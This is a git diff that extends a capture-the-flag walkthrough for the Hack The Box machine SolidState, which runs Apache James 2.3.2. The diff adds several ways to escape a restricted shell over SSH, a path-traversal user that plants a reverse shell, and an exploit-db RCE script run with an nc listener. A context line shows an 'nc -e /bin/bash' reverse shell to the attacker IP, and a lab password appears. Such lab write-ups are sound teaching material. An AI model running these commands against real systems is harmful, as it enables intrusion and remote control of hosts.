@@ -35,6 +35,7 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -
 + Firstly, check TCP port 4555 because it is the James administration port.
 + `searchsploit james 2.3.2`
 + [Apache James Server 2.3.2 - Remote Command Execution](https://www.exploit-db.com/exploits/35513)
++ [Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)](https://www.exploit-db.com/exploits/50347)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a7cb78dc-cf4a-4d77-94a9-ee7f79588aa9)
 
@@ -110,7 +111,7 @@ pass: P@55W0rd1!2@
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2afc76f7-1f35-4a2f-b398-5c0b2cea2755)
 
-+ Alternatively, it is also possible to run ad-hoc commands through SSH using a connection string like this: `ssh username@host <command-here>`
++ **Alternatively 1**, it is also possible to run ad-hoc commands through SSH using a connection string like this: `ssh username@host <command-here>`
 + `ssh mindy@10.10.10.51 'cat /home/mindy/user.txt'`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/605bb879-df74-4eed-8769-9bcc2ca54791)
@@ -127,9 +128,26 @@ pass: P@55W0rd1!2@
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/507882d1-c29e-471e-b6fe-9320d168cd60)
 
++ **Alternatively 2**, `ssh mindy@10.10.10.51 -t "bash --noprofile"`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8c2bf2a7-0bb8-4f15-8320-20649598c2d3)
+
++ **Alternatively 3**, `ssh mindy@10.10.10.51 -t "sh"`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/821443fa-d6db-4989-aec9-20a4ce598efc)
+
++ **Alternatively 4**, `ssh mindy@10.10.10.51 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/sh\")'"`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/17aa6c7b-f1e3-4641-a9b2-7d9225df9184)
+
++ **For more alternatives**, check:
+- [Multiple Methods to Bypass Restricted Shell](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/)
+- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash#get-bash-from-ssh
+
 ### 2.Method:
 + Log back to james remote admin server: `nc 10.10.10.51 4555`
 + Create a user with the username `../../../../../../../../etc/bash_completion.d` and password `123`.
++ This creates a file in **/etc/bash_completion.d** that contains the reverse shell. So that next time any user logs in, get a shell as that user.
 ```
 nc 10.10.10.51 4555
 adduser ../../../../../../../../etc/bash_completion.d 123
@@ -137,7 +155,7 @@ adduser ../../../../../../../../etc/bash_completion.d 123
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0dd154bd-55c6-4f9e-8d75-6e1e2628efe4)
 
-+ Send this user an email that contains a reverse shell. The significant point here is to add **single quote** in the **MAIL FROM** field and after the **FROM** field. 
++ Send this user an email that contains a reverse shell. The significant point here is to add **single quote** in the **MAIL FROM** field and after the **FROM** field. Without the ', there are lines that will crash and break the script before the reverse shell can run.
 ```
 telnet 10.10.10.51 25
 EHLO test
@@ -157,6 +175,18 @@ FROM: test
 + Get the shell without rbash shell!
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1ab9e6be-224e-4740-ae13-3695b6317f04)
+
+### 3.Method:
++ [Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)](https://www.exploit-db.com/exploits/50347)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8441d1ab-28a1-4abe-b16b-71a17f49b74a)
+
++ `python3 50347.py 10.10.10.51 10.10.14.10 6666`
++ `nc -lnvp 6666`
++ Login: `ssh mind@10.10.10.51`
++ Get the shell.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/54b3ecdb-0939-49b5-bc9c-2ea08e1a751e)
 
 
 ## Privilege Escalation
@@ -190,5 +220,14 @@ echo "os.system('/bin/nc -e /bin/bash 10.10.14.10 4444')" >> tmp.py
 + https://vvmlist.github.io/#solidstate
 + https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/solidstate-writeup-w-o-metasploit
++ https://rizemon.github.io/posts/solidstate-htb/
 + https://benheater.com/hackthebox-solidstate/
-+ 
++ https://ethicalhacs.com/solidstate-hackthebox-walkthrough/
++ https://systemweakness.com/htb-solidstate-e8648b92f49c
++ https://www.hackingarticles.in/hack-the-box-challenge-solid-state-walkthrough/
++ https://systemweakness.com/htb-solidstate-writeup-w-o-metasploit-431d9042e2a0
++ https://54m4ri74n.medium.com/solidstate-walkthrough-hackthebox-431b48a6d24a
++ https://sparshjazz.medium.com/hackthebox-solidstate-writeup-f148db31864f
+
+# More:
++ RSIP: https://cheatsheet.haax.fr/network/services-enumeration/4555_rsip/
